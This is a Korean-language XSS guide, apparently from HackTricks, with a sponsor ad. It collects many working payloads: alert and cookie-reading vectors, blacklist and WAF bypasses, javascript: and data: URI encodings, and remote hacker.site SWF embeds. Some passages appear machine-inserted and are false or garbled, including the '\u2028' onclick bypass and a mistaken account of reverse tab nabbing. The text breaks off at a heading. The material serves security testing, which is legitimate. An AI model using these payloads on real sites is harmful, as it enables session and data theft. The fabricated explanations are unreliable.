# XSS (크로스 사이트 스크립팅)

/<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">

**버그 바운티 팁**: 해커들에 의해 만들어진 프리미엄 버그 바운티 플랫폼인 **Intigriti**에 **가입**하세요! 오늘 [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)에서 가입하고 최대 **$100,000**의 바운티를 받으세요!

{% embed url="https://go.intigriti.com/hacktricks" %}

## 방법론

1. **제어 가능한 값**(_파라미터_, _경로_, _헤더_?, _쿠키_?)이 HTML에 **반영**되거나 **JS** 코드에서 **사용**되는지 확인합니다.
2. 반영/사용되는 **컨텍스트**를 찾습니다.
3. 반영된다면
1. **어떤 기호를 사용**할 수 있는지 확인하고, 그에 따라 페이로드를 준비합니다:
1. **원시 HTML**에서:
1. 새로운 HTML 태그를 생성할 수 있나요?
2. `javascript:` 프로토콜을 지원하는 이벤트나 속성을 사용할 수 있나요?
3. 보호 기능을 우회할 수 있나요?
4. HTML 내용이 클라이언트 측 JS 엔진(_AngularJS_, _VueJS_, _Mavo_...)에 의해 해석되고 있다면 [**클라이언트 측 템플릿 삽입**](../client-side-template-injection-csti.md)을 악용할 수 있습니다.
5. JS 코드를 실행하는데 JS 코드를 실행하는 HTML 태그를 생성할 수 없다면 [**댕글링 마크업 - HTML 스크립트리스 삽입**](../dangling-markup-html-scriptless-injection/)을 악용할 수 있을까요?
2. **HTML 태그** 내부에서:
1. 원시 HTML 컨텍스트로 이탈할 수 있나요?
2. JS 코드를 실행하기 위해 새로운 이벤트/속성을 생성할 수 있나요?
3. 갇혀 있는 속성에서 JS 실행을 지원하나요?
4. 보호 기능을 우회할 수 있나요?
3. **JavaScript 코드** 내부에서:
1. `<script>` 태그를 이스케이프할 수 있나요?
2. 문자열을 이스케이프하고 다른 JS 코드를 실행할 수 있나요?
3. 입력이 템플릿 리터럴 \`\`에 있는지 확인하세요.
4. 보호 기능을 우회할 수 있나요?
4. 실행되는 JavaScript **함수**
1. 실행할 함수의 이름을 지정할 수 있습니다. 예: `?callback=alert(1)`
4. **사용**된다면:
1. **DOM XSS**를 악용할 수 있습니다. 입력이 어떻게 제어되는지와 제어 가능한 입력이 어떤 싱크에서 사용되는지에 주의하세요.

복잡한 XSS를 작업할 때 다음에 대해 알아두면 유용할 수 있습니다:

{% content-ref url="debugging-client-side-js.md" %}
[debugging-client-side-js.md](debugging-client-side-js.md)
{% endcontent-ref %}

## 반영된 값

XSS를 성공적으로 악용하려면 먼저 웹 페이지에서 **제어 가능한 값이 반영**되는지 찾아야 합니다.

* **중간에 반영**: 매개변수의 값이나 경로의 값이 웹 페이지에 반영되는 것을 발견하면 **반영된 XSS**를 악용할 수 있습니다.
* **저장 및 반영**: 제어 가능한 값이 서버에 저장되고 페이지에 액세스할 때마다 반영되는 것을 발견하면 **저장된 XSS**를 악용할 수 있습니다.
* **JS를 통해 액세스**: 제어 가능한 값이 JS를 사용하여 액세스되는 것을 발견하면 **DOM XSS**를 악용할 수 있습니다.

## 컨텍스트

XSS를 악용하려면 먼저 **입력이 어디에 반영되는지** 알아야 합니다. 컨텍스트에 따라 다양한 방식으로 임의의 JS 코드를 실행할 수 있습니다.

### 원시 HTML

입력이 **원시 HTML** 페이지에 반영된다면 JS 코드를 실행하기 위해 일부 **HTML 태그**를 악용해야 합니다: `<img , <iframe , <svg , <script` ... 이것은 사용 가능한 많은 HTML 태그 중 일부에 불과합니다.\
또한, [클라이언트 측 템플릿 삽입](../client-side-template-injection-csti.md)을 염두에 두세요.

### HTML 태그 속성 내부

입력이 태그의 속성 값 내부에 반영된다면 다음을 시도해 볼 수 있습니다:

1. 속성과 태그에서 **이스케이프**하여 원시 HTML로 이탈하고 악용할 새로운 HTML 태그를 생성합니다: `"><img [...]`
2. 속성에서 **이스케이프하지만 태그에서 이탈할 수 없는 경우** (`>`가 인코딩되거나 삭제됨), 태그에 따라 JS 코드를 실행하는 **이벤트를 생성**할 수 있습니다: `" autofocus onfocus=alert(1) x="`
3. 속성에서 **이스케이프할 수 없는 경우** (`"`가 인코딩되거나 삭제됨), 반영되는 **어떤 속성**에 따라 **값을 모두 제어할 수 있는지 또는 일부만 제어할 수 있는지**에 따라 악용할 수 있습니다. **예를 들어**, `onclick=`과 같은 이벤트를 제어할 수 있다면 클릭할 때 임의의 코드를 실행할 수 있습니다. 또 다른 흥미로운 **예**는 `href` 속성인데, `javascript:` 프로토콜을 사용하여 임의의 코드를 실행할 수 있습니다: **`href="javascript:alert(1)"`**
4. 입력이 "**악용할 수 없는 태그**" 내부에 반영된다면 취약점을 악용하기 위해 **`accesskey`** 트릭을 시도할 수 있습니다(이를 악용하기 위해 어떤 종류의 사회 공학이 필요합니다): **`" accesskey="x" onclick="alert(1)" x="`**

### JavaScript 코드 내부

이 경우 입력이 HTML 페이지의 **`<script> [...] </script>`** 태그, `.js` 파일 내부 또는 **`javascript:`** 프로토콜을 사용하는 속성 내부에 반영됩니다:

* **`<script> [...] </script>`** 태그 내부에 반영된다면 입력이 어떤 종류의 따옴표 내부에 있더라도 `</script>`를 주입하고 이 컨텍스트에서 이탈할 수 있습니다. 이는 **브라우저가 먼저 HTML 태그를 구문 분석**한 다음 내용을 구문 분석하기 때문에 주입된 `</script>` 태그가 HTML 코드 내부에 있는 것을 인식하지 못하기 때문에 작동합니다.
* **JS 문자열 내부**에 반영되고 마지막 트릭이 작동하지 않는다면 문자열에서 **이탈**하고 코드를 **실행**한 다음 JS 코드를 **재구성**해야 합니다(오류가 있으면 실행되지 않습니다):
* `'-alert(1)-'`
* `';-alert(1)//`
* `\';alert(1)//`
* 템플릿 리터럴 내부에 반영되었다면 `${ ... }` 구문을 사용하여 JS 표현식을 **포함**할 수 있습니다: `` var greetings = `Hello, ${alert(1)}` ``
* **유니코드 인코딩**을 사용하여 **유효한 javascript 코드**를 작성할 수 있습니다:
```javascript
\u{61}lert(1)
\u0061lert(1)
\u{0061}lert(1)
```
#### 자바스크립트 호이스팅

자바스크립트 호이스팅은 **사용된 후에 함수, 변수 또는 클래스를 선언할 수 있는 기회를 가리킵니다. 이를 이용하여 XSS가 선언되지 않은 변수나 함수를 사용하는 시나리오를 악용할 수 있습니다.**\
**자세한 내용은 다음 페이지를 확인하세요:**

{% content-ref url="js-hoisting.md" %}
[js-hoisting.md](js-hoisting.md)
{% endcontent-ref %}

### 자바스크립트 함수

여러 웹 페이지는 **실행할 함수의 이름을 매개변수로 받는** 엔드포인트를 가지고 있습니다. 일반적인 예시로는 `?callback=callbackFunc`와 같은 것이 있습니다.

사용자로부터 직접 제공된 내용이 실행되려고 하는지 확인하는 좋은 방법은 **매개변수 값을 수정**하여 콘솔에서 다음과 같은 오류를 찾는 것입니다:

![](<../../.gitbook/assets/image (651) (2).png>)

취약한 경우, 값 **`?callback=alert(1)`**을 보내는 것만으로도 **경고를 트리거**할 수 있습니다. 그러나 이 엔드포인트는 보통 문자, 숫자, 점 및 밑줄 (**`[\w\._]`**)만 허용하도록 내용을 **검증**합니다.

그러나 그 제한으로도 일부 동작을 수행할 수 있습니다. 이는 유효한 문자를 사용하여 DOM의 **모든 요소에 액세스**할 수 있기 때문입니다:

![](<../../.gitbook/assets/image (662).png>)

이를 위한 유용한 함수 몇 가지:
```
firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement
```
당신은 직접 **Javascript 함수를 트리거**해 볼 수도 있습니다: `obj.sales.delOrders`.

하지만 일반적으로 지정된 함수를 실행하는 엔드포인트는 DOM에 흥미로운 내용이 많지 않은 엔드포인트입니다. **동일 출처의 다른 페이지**에는 **더 흥미로운 DOM**이 있어 더 많은 작업을 수행할 수 있습니다.

따라서, **다른 DOM에서 이 취약점을 악용**하기 위해 **동일 출처 메서드 실행 (SOME)** 공격이 개발되었습니다:

{% content-ref url="some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](some-same-origin-method-execution.md)
{% endcontent-ref %}

### DOM

**JS 코드**에서는 `location.href`와 같이 **공격자가 제어하는 데이터를 안전하지 않게** 사용하고 있습니다. 공격자는 이를 악용하여 임의의 JS 코드를 실행할 수 있습니다.

{% content-ref url="dom-xss.md" %}
[dom-xss.md](dom-xss.md)
{% endcontent-ref %}

### **Universal XSS**

이러한 종류의 XSS는 **어디에서나** 발견될 수 있습니다. 이는 웹 애플리케이션의 클라이언트 공격뿐만 아니라 **모든** **컨텍스트**에 의존하지 않습니다. 이러한 **임의의 JavaScript 실행**은 심지어 **RCE**를 얻거나 클라이언트 및 서버에서 **임의의 파일**을 **읽는 데까지 악용**될 수 있습니다.\
일부 **예시**:

{% content-ref url="server-side-xss-dynamic-pdf.md" %}
[server-side-xss-dynamic-pdf.md](server-side-xss-dynamic-pdf.md)
{% endcontent-ref %}

{% content-ref url="../../network-services-pentesting/pentesting-web/electron-desktop-apps/" %}
[electron-desktop-apps](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
{% endcontent-ref %}

## WAF 우회 인코딩 이미지

![from https://twitter.com/hackerscrolls/status/1273254212546281473?s=21](../../.gitbook/assets/eaubb2ex0aerank.jpg)

## 원시 HTML 내부에 삽입

입력이 **HTML 페이지 내에 반영**되거나 이 문맥에서 HTML 코드를 이스케이프하고 삽입할 수 있는 경우 **첫 번째**로 해야 할 일은 `<`를 사용하여 새 태그를 생성할 수 있는지 확인하는 것입니다. 그냥 그 **문자**를 **반영**하고 그것이 **HTML 인코딩**되었는지 또는 **삭제**되었는지 또는 **변경 없이 반영**되었는지 확인하십시오. **마지막 경우에만 이 케이스를 악용**할 수 있습니다.\
이러한 경우에는 [**클라이언트 측 템플릿 인젝션**](../client-side-template-injection-csti.md)**도 염두에 두세요**.\
_**참고: HTML 주석은 `-->` 또는 `--!>`를 사용하여 닫을 수 있습니다.**_

이 경우에는 블랙리스트/화이트리스트가 사용되지 않는다면, 다음과 같은 페이로드를 사용할 수 있습니다:
```html
<script>alert(1)</script>
<img src=x onerror=alert(1) />
<svg onload=alert('XSS')>
```
하지만, 태그/속성의 블랙리스트/화이트리스트가 사용되고 있다면, 어떤 태그를 생성할 수 있는지 **브루트 포스**해야 합니다.\
유효한 태그를 찾은 후에는, 해당 태그 내에서 어떻게 공격할 수 있는지 알아보기 위해 발견한 유효한 태그 내에서 **속성/이벤트를 브루트 포스**해야 합니다.

### 태그/이벤트 브루트 포스

[**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)로 이동하여 _**Copy tags to clipboard**_를 클릭합니다. 그런 다음, Burp Intruder를 사용하여 모든 태그를 보내고 WAF에서 악성 태그로 감지되지 않은 태그가 있는지 확인합니다. 사용할 수 있는 태그를 발견한 후에는, 유효한 태그를 사용하여 **모든 이벤트를 브루트 포스**할 수 있습니다 (동일한 웹 페이지에서 _**Copy events to clipboard**_를 클릭하고 이전과 동일한 절차를 따릅니다).

### 사용자 정의 태그

유효한 HTML 태그를 찾지 못한 경우, **사용자 정의 태그를 생성**하고 `onfocus` 속성을 사용하여 JS 코드를 실행해 볼 수 있습니다. XSS 요청에서 URL을 `#`로 끝내면 페이지가 해당 객체에 **포커스를 맞추고** 코드를 **실행**합니다.
```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```
### 블랙리스트 우회

만약 어떤 종류의 블랙리스트가 사용되고 있다면, 몇 가지 어리석은 트릭을 사용하여 우회해 볼 수 있습니다:
```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```
### 길이 우회 (작은 XSSs)

{% hint style="info" %}
**다양한 환경에 대한 더 작은 XSS** 페이로드는 [**여기에서**](https://github.com/terjanq/Tiny-XSS-Payloads)와 [**여기에서**](https://tinyxss.terjanq.me) 찾을 수 있습니다.
{% endhint %}
```html
<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``>
<script src=//aa.es>
<script src=//℡㏛.pw>
```
마지막은 2개의 유니코드 문자를 사용하여 5개로 확장하는 것입니다: telsr\
더 많은 이러한 문자는 [여기](https://www.unicode.org/charts/normalization/)에서 찾을 수 있습니다.\
문자가 분해되는지 확인하려면 [여기](https://www.compart.com/en/unicode/U+2121)를 확인하세요.

### XSS 클릭 - 클릭재킹

취약점을 악용하기 위해 **사용자가 링크나 폼을 클릭**해야 한다면 [**클릭재킹을 악용**](../clickjacking.md#xss-clickjacking)해 볼 수 있습니다(페이지가 취약한 경우).

### 불가능 - 미완성된 마크업

HTML 태그에 JS 코드를 실행할 속성을 생성하는 것이 **불가능하다고 생각**한다면 [**미완성된 마크업**](../dangling-markup-html-scriptless-injection/)을 확인해 보세요. JS 코드를 실행하지 않고도 취약점을 **악용**할 수 있습니다.

## HTML 태그 내부에 주입하기

### 태그 내부/속성 값에서 탈출하기

**HTML 태그 내부**에 있다면, 먼저 태그에서 탈출하고 [이전 섹션](./#injecting-inside-raw-html)에서 언급된 기술 중 일부를 사용하여 JS 코드를 실행해 볼 수 있습니다.\
태그에서 탈출할 수 없다면, 태그 내부에 새로운 속성을 생성하여 JS 코드를 실행해 볼 수 있습니다. 예를 들어 다음과 같은 페이로드를 사용할 수 있습니다(이 예제에서는 속성에서 탈출하기 위해 이중 인용부호를 사용했는데, 입력이 태그 내부에 직접 반영된다면 이중 인용부호는 필요하지 않습니다):
```bash
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```
**스타일 이벤트**

Style 이벤트는 Cross-Site Scripting (XSS) 공격에서 사용되는 기법 중 하나입니다. 이 기법은 HTML 요소의 스타일 속성을 이용하여 악성 스크립트를 삽입하는 것을 의미합니다. 스타일 이벤트는 사용자의 브라우저에서 스크립트를 실행시킬 수 있는 취약점을 이용하여 공격자가 웹 페이지를 조작하거나 사용자의 정보를 탈취할 수 있습니다.

스타일 이벤트는 주로 `onmouseover`, `onload`, `onerror`와 같은 이벤트 핸들러를 이용하여 악성 스크립트를 실행시킵니다. 이러한 이벤트 핸들러는 HTML 요소에 직접 삽입되거나, CSS 스타일 시트를 통해 적용될 수 있습니다. 공격자는 이를 이용하여 사용자의 브라우저에서 스크립트를 실행시키고, 쿠키 정보를 탈취하거나 악성 행위를 수행할 수 있습니다.

스타일 이벤트를 방지하기 위해서는 입력값을 적절히 필터링하고 이스케이프 처리해야 합니다. 또한, Content Security Policy (CSP)를 설정하여 스크립트 실행을 제한하는 것이 좋습니다. XSS 공격은 웹 애플리케이션의 보안을 강화하기 위해 주의해야 할 중요한 취약점입니다.
```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```
### 속성 내부에서

속성에서 **이스케이프할 수 없는 경우** (`"`가 인코딩되거나 삭제됨), 제어하는 값이 **어떤 속성에 반영되는지에 따라 제어하는 값이 전체인지 일부인지**에 따라 악용할 수 있습니다. **예를 들어**, `onclick=`과 같은 이벤트를 제어하는 경우, 클릭할 때 임의의 코드를 실행할 수 있습니다.\
또 다른 흥미로운 **예시**는 `href` 속성인데, `javascript:` 프로토콜을 사용하여 임의의 코드를 실행할 수 있습니다: **`href="javascript:alert(1)"`**

**HTML 인코딩/URL 인코딩을 사용한 이벤트 내부 우회**

HTML 태그 속성의 값 내부에 있는 **HTML 인코딩된 문자**는 **런타임에서 디코딩**됩니다. 따라서 다음과 같은 것이 유효합니다 (페이로드는 굵게 표시됨): `<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

**어떤 종류의 HTML 인코딩이든 유효**함을 유의하세요:
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>
```
**URL 인코딩도 작동합니다:**
```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```
**유니코드 인코딩을 사용하여 내부 이벤트 우회하기**

Sometimes, web applications implement security measures to prevent the execution of certain events, such as the `onclick` event. However, it is possible to bypass these restrictions using Unicode encoding.

In Unicode encoding, characters are represented by their corresponding Unicode code points. By using certain Unicode characters, we can trick the application into allowing the execution of restricted events.

To bypass the `onclick` event restriction, we can use the Unicode character `\u2028`. This character is a line separator in Unicode, but it is treated as a whitespace character by JavaScript. By injecting this character into an event attribute, we can bypass the restriction and execute our desired code.

For example, consider the following vulnerable code snippet:

```html
<button onclick="alert('Restricted event bypassed!')">Click me</button>
```

To bypass the `onclick` event restriction, we can encode the event attribute as follows:

```html
<button on\u2028click="alert('Restricted event bypassed!')">Click me</button>
```

When the button is clicked, the `alert` function will be executed, even though the `onclick` event was restricted.

It is important to note that this technique may not work in all scenarios, as web application security measures can vary. Additionally, it is crucial to always obtain proper authorization before attempting any security testing or exploitation.
```javascript
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```
### 속성 내 특수 프로토콜

여기서는 몇 군데에서 **임의의 JS 코드를 실행**하기 위해 **`javascript:`** 또는 **`data:`** 프로토콜을 사용할 수 있습니다. 일부는 사용자 상호작용을 요구하고 일부는 그렇지 않을 수 있습니다.
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3aalert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```
**이러한 프로토콜을 삽입할 수 있는 위치**

**일반적으로** `javascript:` 프로토콜은 `href` 속성을 허용하는 **모든 태그**와 **대부분의 태그**(`img` 제외)에서 **`src` 속성**을 허용합니다.
```markup
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```
**기타 난독화 기법**

_**이 경우 이전 섹션에서 언급한 HTML 인코딩 및 유니코드 인코딩 트릭도 속성 내부에 있으므로 유효합니다.**_
```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```
또한, 이러한 경우에 대한 또 다른 **좋은 트릭**이 있습니다: **`javascript:...` 내부의 입력이 URL 인코딩되어 있더라도, 실행되기 전에 URL 디코딩됩니다.** 따라서, **문자열**에서 **단일 인용부호**를 **이스케이프**해야 할 필요가 있고, **URL 인코딩**이 되어 있다고 보신다면, **중요하지 않습니다,** 실행 시간에는 **단일 인용부호**로 **해석**될 것입니다.
```javascript
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```
참고로, 페이로드를 인코딩하기 위해 `URLencode + HTMLencode`를 어떤 순서로 사용하려고 해도 작동하지 않지만, 페이로드 내에서 둘을 혼합할 수 있습니다.

**`javascript:`와 함께 16진수 및 8진수 인코딩 사용하기**

적어도 `iframe`의 `src` 속성 내에서 **HTML 태그를 실행하는**데 **16진수** 및 **8진수 인코딩**을 사용할 수 있습니다.
```javascript
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```
### 역 탭 납치

Reverse tab nabbing은 공격자가 희생자의 브라우저 탭을 이용하여 정보를 탈취하는 기술입니다. 이 공격은 희생자가 악성 웹 페이지를 방문하고, 그 페이지에서 다른 탭으로 이동하거나 닫을 때 발생합니다. 공격자는 악성 웹 페이지에서 JavaScript를 사용하여 희생자의 현재 탭을 감시하고, 희생자가 다른 탭으로 이동하거나 닫을 때 악성 코드를 실행합니다. 이를 통해 공격자는 희생자의 세션 정보나 기타 중요한 정보를 탈취할 수 있습니다.

이 공격을 방지하기 위해서는 항상 신뢰할 수 있는 웹 사이트를 방문하고, 악성 코드가 포함된 웹 페이지를 피해야 합니다. 또한, 브라우저의 보안 설정을 업데이트하고, 스크립트 실행을 제한하는 확장 프로그램을 설치하는 것이 좋습니다.
```javascript
<a target="_blank" rel="opener"
```
임의의 **`<a href=`** 태그에 **`target="_blank"`** 및 **`rel="opener"`** 속성이 포함된 URL을 삽입할 수 있다면, 다음 페이지를 확인하여 이 동작을 악용할 수 있습니다:

{% content-ref url="../reverse-tab-nabbing.md" %}
[reverse-tab-nabbing.md](../reverse-tab-nabbing.md)
{% endcontent-ref %}

### 이벤트 핸들러 우회

먼저 유용한 **"on" 이벤트 핸들러**에 대해 확인하려면 이 페이지([https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet))를 확인하세요.\
이벤트 핸들러를 생성하는 데 제한을 두는 블랙리스트가 있는 경우 다음 우회 방법을 시도할 수 있습니다:
```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```
### "사용할 수 없는 태그"에서의 XSS (숨겨진 입력, 링크, canonical, 메타)

[**여기**](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags)에서는 이제 다음과 같이 숨겨진 입력을 악용할 수 있습니다:
```html
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle=alert(1)>
```
그리고 **메타 태그**에서는:
```html
<!-- Injection inside meta attribute-->
<meta name="apple-mobile-web-app-title" content=""Twitter popover id="newsletter" onbeforetoggle=alert(2) />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```
[**여기**](https://portswigger.net/research/xss-in-hidden-input-fields)에서: **피해자**를 **설득**하여 **키 조합**을 누르게 할 수 있다면, **숨겨진 속성** 내에서 **XSS 페이로드를 실행**할 수 있습니다. Firefox Windows/Linux에서 키 조합은 **ALT+SHIFT+X**이고, OS X에서는 **CTRL+ALT+X**입니다. 액세스 키 속성에서 다른 키를 사용하여 다른 키 조합을 지정할 수 있습니다. 다음은 벡터입니다:
```markup
<input type="hidden" accesskey="X" onclick="alert(1)">
```
**XSS 페이로드는 다음과 같을 것입니다: `" accesskey="x" onclick="alert(1)" x="`**

### 블랙리스트 우회

이 섹션에서는 이미 다양한 인코딩을 사용한 여러 가지 트릭이 소개되었습니다. 다음에서 어디에서 사용할 수 있는지 알아보기 위해 **돌아가세요:**

* **HTML 인코딩 (HTML 태그)**
* **유니코드 인코딩 (유효한 JS 코드가 될 수 있음):** `\u0061lert(1)`
* **URL 인코딩**
* **16진수 및 8진수 인코딩**
* **데이터 인코딩**

**HTML 태그 및 속성 우회**

[이전 섹션의 블랙리스트 우회](./#blacklist-bypasses)를 읽으세요.

**JavaScript 코드 우회**

[다음 섹션의 JavaScript 우회 블랙리스트 기술](./#javascript-bypass-blacklists-techniques)을 읽으세요.

### CSS-Gadgets

웹의 매우 작은 부분에서 **상호 작용이 필요한** XSS를 발견한 경우 (아마도 푸터에 작은 링크와 onmouseover 요소가 있는 경우) 링크가 실행될 확률을 최대화하기 위해 **요소가 차지하는 공간을 수정**해 볼 수 있습니다.

예를 들어, 다음과 같이 요소에 스타일을 추가할 수 있습니다: `position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5`

하지만, WAF가 스타일 속성을 필터링하는 경우 CSS 스타일링 가젯을 사용할 수 있습니다. 따라서, 예를 들어 다음과 같은 것을 찾았다면

> .test {display:block; color: blue; width: 100%\}

그리고

> \#someid {top: 0; font-family: Tahoma;}

이제 링크를 수정하고 다음과 같은 형태로 가져올 수 있습니다.

> \<a href="" id=someid class=test onclick=alert() a="">

이 요령은 [https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703](https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703)에서 가져온 것입니다.

## JavaScript 코드 내부에 주입하기

이 경우에는 **입력**이 `.js` 파일의 JS 코드 내부나 `<script>...</script>` 태그 사이 또는 JS 코드를 실행할 수 있는 HTML 이벤트 사이 또는 `javascript:` 프로토콜을 허용하는 속성 사이에 **반영**될 것입니다.

### \<script> 태그 이스케이프

코드가 `<script> [...] var input = '반영된 데이터' [...] </script>` 내에 삽입된 경우, **\<script>** 태그를 간단히 **이스케이프**할 수 있습니다:
```javascript
</script><img src=1 onerror=alert(document.domain)>
```
이 예제에서는 심지어 **단일 따옴표를 닫지 않았습니다**. 이는 **HTML 파싱이 먼저 브라우저에 의해 수행**되기 때문에 스크립트 블록을 포함한 페이지 요소를 식별하는 것을 의미합니다. 내장된 스크립트를 이해하고 실행하기 위한 JavaScript의 파싱은 그 후에 수행됩니다.

### JS 코드 내부

`<>`가 살균되고 있다면 입력이 **위치한 곳에서 문자열을 이스케이프**할 수 있으며 **임의의 JS를 실행**할 수 있습니다. JS 구문을 **수정하는 것이 중요**합니다. 오류가 있으면 JS 코드가 실행되지 않을 수 있습니다.
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```
### 템플릿 리터럴 \`\`

